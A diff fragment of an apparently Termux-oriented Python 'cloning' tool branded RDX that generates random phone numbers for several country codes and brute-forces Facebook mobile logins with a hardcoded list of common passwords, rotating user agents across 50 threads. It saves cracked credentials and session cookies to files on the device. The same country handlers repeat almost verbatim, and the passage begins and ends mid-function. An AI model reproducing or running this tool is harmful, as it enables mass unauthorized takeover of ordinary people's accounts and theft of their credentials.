+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+48"
-		os.system('clear')
-		print(logo)
-		print(logo16)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def pak():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo17)
 	print("\x1b[1;97m01, ~to~~, 49")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+923"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo17)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+923"
-		os.system('clear')
-		print(logo)
-		print(logo17)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def indonesia():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo18)
 	print("\x1b[1;97m81,83,85,84,89,")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+62"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo18)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+880"
-		os.system('clear')
-		print(logo)
-		print(logo18)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def greece():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo19)
 	print("\x1b[1;97m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+30"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo19)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+3069"
-		os.system('clear')
-		print(logo)
-		print(logo19)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
